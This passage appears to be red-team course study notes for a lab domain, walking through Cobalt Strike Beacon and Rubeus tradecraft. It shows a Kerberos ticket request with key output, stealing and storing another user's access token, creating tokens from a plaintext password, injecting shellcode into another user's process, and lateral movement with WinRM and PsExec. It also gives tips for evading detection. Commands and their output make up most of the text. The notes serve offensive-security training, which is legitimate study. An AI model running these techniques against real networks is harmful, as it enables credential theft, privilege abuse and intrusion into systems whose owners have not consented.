MHAwUAQOEAAKURGA8yMDI1MTExOTAwMjQyMVqmERgPMjAyNTExMTkxMDI0MjFapxEYDzIwMjUxMTI2MDAyNDIxWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jking
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  11/19/2025 12:24:21 AM
  EndTime                  :  11/19/2025 10:24:21 AM
  RenewTill                :  11/26/2025 12:24:21 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  p54W5zJmPXXgpjErEIk3kaDOQElYE6CUj5rNQkiZSoU=
  ASREP (key)              :  4A8A74DAAD837AE09E9ECC8C2F1B89F960188CB934DB6D4BBEBADE8318AE57C6


[11/19 00:24:26] [+] job 10 completed
```

### If no /domain is specified...

{% hint style="danger" %}
This is for OpSec, don't worry about in the exam but is good practice.
{% endhint %}

If no `/domain` is specified, Rubeus uses the FQDN of the domain this computer is in.  Instead, we can force it to use the NetBIOS name with `/domain:DEV`.  There is also an `/opsec` flag which tells Rubeus to request the TGT in such a way that results in the Ticket Options being `0x40810010`.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
```

## Token Impersonation

{% hint style="warning" %}
Must be in an elevated session to see all processes for all users.
{% endhint %}

If we elevate or land on a system where a user is running a process, we can impersonate its token without having to jump through additional hoops.

**If we list the running processes on Workstation 2 from an elevated prompt, we see that `jking` is running an instance of `mmc.exe`:**

```
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking
```

<figure><img src="../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

**We can now steal its token and access a target:**

```
beacon> steal_token 21628

[+] Impersonated DEV\jking

beacon> ls \\web.dev.cyberbotic.io\c$
[11/19 00:29:10] [*] Tasked beacon to list files in \\web.dev.cyberbotic.io\c$
[11/19 00:29:11] [+] host called home, sent: 44 bytes
[11/19 00:29:12] [*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 08:38:47   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     11/18/2025 22:01:11   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     11/02/2022 09:32:00   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     09/26/2023 08:51:14   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     11/18/2025 21:51:12   DumpStack.log.tmp
 384mb    fil     11/18/2025 21:51:12   pagefile.sys

```

## Token Store

**This is an evolution on the `steal_token` command which allows you to steal and store tokens for future use.** &#x20;

**For example, steal a token and add it to the token store with `token-store steal <pid>`:**

```
beacon> token-store steal 21628

[11/19 00:31:16] [*] Tasked beacon to steal token from PID(s) 21628
[11/19 00:31:17] [+] host called home, sent: 24 bytes
[11/19 00:31:17] [*] Stored Tokens
```

#### List Stored Tokens

```
beacon> token-store show

 ID   User
 --   ----
 0    DEV\jking
```

#### Using Stored Tokens

```
beacon> token-store use 0
[+] Impersonated DEV\jking
```

#### But what if we drop impersonation?

Yes, the tokens will remain in the store so we can impersonate them once more.

#### Removing Tokens

```
token-store remove <id>

token-store remove-all
```

## Make Token

This <mark style="color:yellow;">allows us to impersonate a user if we know their plaintext password</mark>.

This works under the hood by calling the [LogonUserA](https://learn.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API.

```
beacon> make_token DEV\jking Qwerty123
[11/19 00:34:26] [*] Tasked beacon to create a token for DEV\jking
[11/19 00:34:28] [+] host called home, sent: 37 bytes
[11/19 00:34:28] [+] Impersonated DEV\jking (netonly)
```

**The logon session created with `LogonUserA` has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource:**

```
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
dev\jking
```

This also means that `make_token` is not applicable to anything you may want to run on the current machine.  For that, `spawnas` may be a better solution.

## Process Injection

This allows us to inject arbitrary shellcode into a process of our choosing.

We can inject into processes that we can obtain a handle to with enough privileges to write into its memory.

{% hint style="warning" %}
In a non-elevated context, this limits us to our own processes.

In an elevated context, this means that we can inject in processes owned by other users.
{% endhint %}

### Injecting into MMC process we identified earlier

```
beacon> inject 21628 x64 tcp-local

[11/19 00:39:17] [*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 21628 (x64)
[11/19 00:39:22] [+] host called home, sent: 334007 bytes
[11/19 00:39:32] [+] established link to child beacon: 10.10.123.102
```

{% hint style="success" %}
The command will also automatically attempt to connect to the child if a P2P listener is used. The resulting Beacon will run with the full privilege of the user who owns the process.
{% endhint %}

{% hint style="info" %}
The same caveats also apply - if the user closes this process, the Beacon will be lost.  The shellcode that's injected uses the Exit Thread function, so it won't kill the process if we exit the Beacon.
{% endhint %}

## Lateral Movement

This is the act of moving laterally between computers in a domain to access sensitive information/materials/creds/etc.

### Listing jump Methods w/ the jump Command

**We can use `jump` to see a list of methods:**

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

### remote-exec Strategy

```
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

You also need to connect to P2P Beacons manually using `connect` or `link`.

### Remote Seatbelt Commands

**Some of Seatbelt's commands can also be run remotely, which can be useful enumerating its configurations and defences before jumping to it:**

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

====== OSInfo ======


[11/19 00:55:55] [+] [job 1] received output:
  Hostname                      :  web
  Domain Name                   :  dev.cyberbotic.io
  Username                      :  
  ProductName                   :  Windows Server 2022 Datacenter
  EditionID                     :  ServerDatacenter
  ReleaseId                     :  2009
  Build                         :  20348
  BuildBranch                   :  fe_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  False
  BootTimeUtc (approx)          :  1/1/0001 12:00:00 AM (Total uptime: 739573:00:55:50)
  HighIntegrity                 :  True
  IsLocalAdmin                  :  True
  CurrentTimeUtc                :  11/19/2025 12:55:50 AM (Local time: 11/19/2025 12:55:50 AM)
  TimeZone                      :  
  TimeZoneOffset                :  
  InputLanguage                 :  
  InstalledInputLanguages       :  
  MachineGuid                   :  a2c3c656-7dd3-4c1d-81e9-9e78bfd50edf
```

## Windows Remote Management (WRM)

The `winrm` and `winrm64` methods can be used for 32 and 64-bit targets as appropriate.

### Lateral Movement SMB Beacon

```
beacon> jump winrm64 web.dev.cyberbotic.io smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10) on web.dev.cyberbotic.io via WinRM
[+] host called home, sent: 225172 bytes
[+] established link to child beacon: 10.10.122.30
```

WinRM will return a high integrity Beacon running as the user with which you're interacting with the remote machine as (see below).

<figure><img src="../../.gitbook/assets/image (365).png" alt=""><figcaption></figcaption></figure>

## PsExec

The `psexec` / `psexec64` commands work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. &#x20;

Beacons executed this way run as `SYSTEM`.

<figure><img src="../../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure>
